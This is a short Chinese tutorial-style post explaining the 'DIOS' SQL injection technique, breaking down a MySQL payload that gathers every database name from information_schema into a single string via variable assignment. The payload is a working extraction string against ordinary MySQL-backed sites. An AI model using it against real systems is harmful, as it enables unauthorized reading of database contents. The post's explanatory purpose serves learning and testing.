在https://mp.weixin.qq.com/s/84se5CxYlVT05bcw654wKg 这篇文章中首次看到的DIOS，感觉好像很厉害的样子，遂去网上开始找资料

先说结论（个人理解）：不是什么新的SQL注入漏洞利用方式，只是一种“在一条语句中提取全部数据的方便的”提取方式

一次性返回所有数据库的名称：  
```
(select (@a) from (select(@a:=0x00),(select (@a) from (information_schema.schemata) where (@a) in (@a:=concat(@a,schema_name,'<br>'))))a);
```
![image](./0.png)  
解释：  
首先需要知道3个事：  
1、@a是sql中的变量，涉及到它的表达式需要用括号扩上  
2、:=是sql中的赋值符号  
3、sql中的函数concat有一个特性，如果参数中有一个为NULL，那么结果为NULL，所以需要先执行select(@a:=0x00)  
从最内层开始解释：  
```
(@a:=concat(@a,schema_name,'<br>'))
```
连接这3个参数的值  
倒数第二层的解释，此时语句变成了：  
```
(select (@a) from ( information_schema.schemata) where (@a) in (@a:=concat(@a,schema_name,'<br>')) )
```
通常的where in用法形如：select x from y where x in '1,2,3'是选择某个字段，然后字段值在某个范围  
但是此条语句并不是通常的where in用法，而是将information_schema.schemata中schema_name的值依次添加到变量@a中  
倒数第三层的解释，此时语句变成了：  
```
(select (@a) from (select(@a:=0x00),expr1)a);
```
再进一步简化一下：  
```
(select (@a) from (expr2)a);
```
此条语句即表示：选择@a的值  
此时查看@a的值如下  
![image](./1.png)  
此时
```
(select(@a:=0x00),(select (@a) from (information_schema.schemata) where (@a) in (@a:=concat(@a,schema_name,'<br>'))));
```
的值如下  
![image](./2.png)  
